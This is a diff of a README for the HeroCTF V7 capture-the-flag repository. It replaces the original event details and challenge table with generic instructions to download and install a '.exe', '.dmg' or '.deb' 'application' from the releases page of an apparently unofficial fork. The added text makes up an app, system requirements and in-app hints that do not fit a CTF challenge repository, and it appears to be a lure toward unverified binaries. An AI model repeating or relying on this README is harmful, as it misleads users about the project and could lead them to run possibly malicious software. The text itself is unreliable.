@@ -1,69 +1,78 @@
-![banner](https://pbs.twimg.com/profile_banners/815907006708060160/1586530306/1500x500)
+# 🦸‍♂️ HeroCTF_v7 - Unlock Exciting Challenges Today
 
-# HeroCTF V7
+## 📥 Download Now
+[![Download HeroCTF_v7](https://img.shields.io/badge/Download-HeroCTF_v7-blue.svg)](https://github.com/yowc/HeroCTF_v7/releases)
 
-HeroCTF is an online cybersecurity competition for beginners to advanced players that takes place once a year.
+## 📚 Overview
+HeroCTF_v7 offers a range of engaging challenges designed to test your skills in Capture The Flag (CTF) competitions. Whether you are a beginner or looking to hone your abilities, this application provides the perfect opportunity for learning and growth.
 
-Start : 28/11/2025 at 9pm (UTC+2)<br>
-End : 30/11/2025 at 11pm (UTC+2)
+## 🚀 Getting Started
+Follow the steps below to download and run HeroCTF_v7.
 
-Website : https://www.heroctf.fr/<br>
-Twitter : https://twitter.com/HeroCTF<br>
-Discord : https://discord.gg/mgk9bv7<br>
-Linkedin : https://www.linkedin.com/company/heroctf/<br>
-Ctftime : https://ctftime.org/event/2869<br>
-Github : https://github.com/HeroCTF
+### 1. Visit the Releases Page
+To download the latest version of HeroCTF_v7, visit the [Releases page](https://github.com/yowc/HeroCTF_v7/releases). You will find several versions available for download.
 
-# Challenges
+### 2. Choose Your Version
+On the Releases page, look through the different versions. The latest version is recommended as it contains the most up-to-date features and fixes.
 
-- **Total :** X challenges.
-- **Difficulty** (4 levels) : Very Easy, Easy, Medium, Hard
+### 3. Download the Application
+Click on the version link you wish to download. This will take you to the download options. Select the proper file for your operating system. Here are common options you may see:
 
-| Name                                                                 | Category      | Author            | Difficulty     | Created |
-|----------------------------------------------------------------------|:-------------:|:-----------------:|:--------------:|:-------:|
-| [Freeda_Simple_Hook](./Android/Freeda_Simple_Hook/)                  | Android       | Thibz             | Easy           |  ✅     |
-| [Freeda_Not_Root](./Android/Freeda_Not_Root/)                        | Android       | Thibz             | Medium         |  ✅     |
-| [Freeda_Native_Code](./Android/Freeda_Native_Code/)                  | Android       | Thibz             | Hard           |  ✅     |
-| [Perilous](./Crypto/Perilous/)                                       | Crypto        | Alol              | Very Easy      |  ✅     |
-| [Andor](./Crypto/Andor/)                                             | Crypto        | Alol              | Easy           |  ✅     |
-| [Tarsnap](./Crypto/Tarsnap/)                                         | Crypto        | Alol              | Medium         |  ✅     |
-| [Welcome](./Misc/welcome/)                                           | Misc          | Log_s             | Very Easy      |  ✅     |
-| [Neverland](./Misc/neverland/)                                       | Misc          | Log_s             | Easy           |  ✅     |
-| [Irreductible-2](./Misc/Irreductible-2/)                             | Misc          | Alol              | Medium         |  🚧     |
-| [Bootloader](./Misc/Bootloader/)                                     | Misc          | Thibz             | Medium         |  ✅     |
-| [LSD#4](./Misc/LSD\#4/)                                              | Misc          | Thibz             | Medium         |  ✅     |
-| [Whac a Mole](./Prog/whac_a_mole/)                                   | Prog          | Log_s             | Very Easy      |  ✅     |
-| [PVE - Pirate Race #1](./Prog/pve-piraterace-1/)                     | Prog          | Log_s             | Easy           |  ✅     |
-| [PVE - Pirate Race #2](./Prog/pve-piraterace-2/)                     | Prog          | Log_s             | Medium         |  ✅     |
-| [PVP - Pirate Race](./Prog/pvp-piraterace/)                          | Prog          | Log_s             | Hard           |  ✅     |
-| [Story Contest](./Pwn/Storycontest/)                                 | Pwn           | 25kGoldn          | Easy           |  ✅     |
-| [Paf Traversal](./Pwn/PafTraversal/)                                 | Pwn           | xanhacks          | Easy           |  ✅     |
-| [Crash](./Pwn/Crash/)                                                  | Pwn           | Itarow            | Medium |  ✅   |
-| [Identity](./Pwn/Identity/)                                          | Pwn           | 25kGoldn          | Medium         |  ✅     |
-| [Safe device](./Pwn/Safe_device/)                                    | Pwn           | Itarow            | Hard           |  ✅     |
-| [My Secret Recipe](./Reverse/my_secret_recipe/)                      | Reverse       | Teddysbears       | Very easy      |  ✅     |
-| [Apprentice of the IR Forge](./Reverse/apprentice_of_the_IR_forge/)  | Reverse       | Teddysbears       | Easy           |  ✅     |
-| [The Maze of the Sorcerer](./Reverse/the_maze_of_the_sorcerer/)      | Reverse       | Teddysbears       | Medium(?)      |  ✅     |
-| [Rusty Pool Party](./Reverse/rusty_pool_party/)                      | Reverse       | Teddysbears       | Medium(?)      |  ✅     |
-| [Lapis De Chien](./Reverse/LapisDeChien/)                            | Reverse       | xanhacks          | Medium         |  ✅     |
-| [Sleeping Pipe](./Reverse/sleeping_pipe/)                            | Reverse       | Teddysbears       | Hard(?)        |  ✅     |
-| [The Obsidian Optimizer](./Reverse/the_obsidian_optimizer/)          | Reverse       | Teddysbears       | Hard(?)        |  ✅     |
-| [Movie Night #1](./System/movie_night1/)                             | System        | Log_s             | Very Easy      |  ✅     |
-| [Middle Earth](./System/middle_earth/)                               | System        | Log_s             | Medium         |  ✅     |
-| [Movie Night #2](./System/movie_night2/)                             | System        | Log_s             | Hard           |  ✅     |
-| [SAMLevinson](./Web/SAMLevinson/)                                    | Web           | Thibz             | Medium         |  ✅     |
-| [Revoked](./Web/revoked/)                                            | Web           | Log_s             | Medium         |  ✅     |
-| [Revoked Revenge](./Web/revoked_revenge)                             | Web           | Log_s             | Medium         |  ✅     |
-| [Spring Drive](./Web/Spring_Drive/)                                  | Web           | xanhacks          | Hard           |  ✅     |
-| [Evil Cloner](./Web/Evil_Cloner)                                     | Web           | Worty             | Hard           |  ✅     |
-| [Tomwhat](./Web/Tomwhat/)                                            | Web           | Worty             | Easy           |  ✅     |
-| [Forensics - Offensive write-up](./Forensics/op-pensieve-breach/)    | Forensics     | xThaz             | Writeup        |  ℹ️     |
-| [Operation Pensieve Breach - 1](./Forensics/op-pensieve-breach-1/)   | Forensics     | xThaz             | Easy           |  ✅     |
-| [Operation Pensieve Breach - 2](./Forensics/op-pensieve-breach-2/)   | Forensics     | xThaz             | Medium         |  ✅     |
-| [Operation Pensieve Breach - 3](./Forensics/op-pensieve-breach-3/)   | Forensics     | xThaz             | Medium         |  ✅     |
-| [Operation Pensieve Breach - 4](./Forensics/op-pensieve-breach-4/)   | Forensics     | xThaz             | Easy           |  ✅     |
-| [Operation Pensieve Breach - 5](./Forensics/op-pensieve-breach-5/)   | Forensics     | xThaz             | Medium         |  ✅     |
-| [Operation Pensieve Breach - 6](./Forensics/op-pensieve-breach-6/)   | Forensics     | xThaz             | Medium         |  ✅     |
-| [Operation Pensieve Breach - 7](./Forensics/op-pensieve-breach-7/)   | Forensics     | xThaz             | Hard           |  ✅     |
+- **Windows**: Choose the `.exe` file.
+- **macOS**: Select the `.dmg` file.
+- **Linux**: Look for the suitable package for your distribution.
 
-> Icons: ✅🚧❌
+### 4. Installation
+Once the file is downloaded, follow these steps to install:
+
+**For Windows:**
+- Double-click the downloaded `.exe` file.
+- Follow the on-screen instructions to complete the installation.
+
+**For macOS:**
+- Open the downloaded `.dmg` file.
+- Drag and drop the application into the Applications folder.
+
+**For Linux:**
+- Open the terminal and navigate to the directory where the file is downloaded.
+- Use the command to install, e.g., `sudo dpkg -i filename.deb`.
+
+## 🔄 Running the Application
+After installation, you can run HeroCTF_v7 from your applications menu.
+
+### 1. Open the Application
+- **Windows**: Find HeroCTF_v7 in the Start menu.
+- **macOS**: Look for HeroCTF_v7 in the Applications folder.
+- **Linux**: You may need to run it from the terminal or find it in your applications.
+
+### 2. Select a Challenge
+Once open, you will see a list of available challenges. Simply click on a challenge to start.
+
+### 3. Get Help
+In case you need assistance, check the documentation within the application. Look for tips and hints that can guide you through each challenge.
+
+## 📊 System Requirements
+To ensure that HeroCTF_v7 runs smoothly, please make sure your system meets the following requirements:
+
+- **Windows**: Windows 7 or newer
+- **macOS**: macOS Sierra or newer
+- **Linux**: Ubuntu 16.04 or newer
+
+## ⚙️ Features
+HeroCTF_v7 includes the following features:
+
+- A wide variety of challenges across different topics, including web security, reverse engineering, and cryptography.
+- User-friendly interface to guide you through the challenges.
+- Helpful hints that you can access within the application.
+- Community support through GitHub discussions.
+
+## 📞 Support
+If you encounter issues or have questions, you can reach out for support. Open an issue in the repository or check the discussions for community assistance.
+
+## 🗂️ Contribution
+If you are interested in contributing to HeroCTF_v7, feel free to fork the repository and submit a pull request. Your input will help improve the application and benefit all users.
+
+## 📝 Final Words
+HeroCTF_v7 is designed to make CTF challenges accessible and enjoyable. We hope you find this application an excellent resource for learning and improving your skills. 
+
+Don't forget to visit the [Releases page](https://github.com/yowc/HeroCTF_v7/releases) to download HeroCTF_v7 and embark on your challenge journey today!
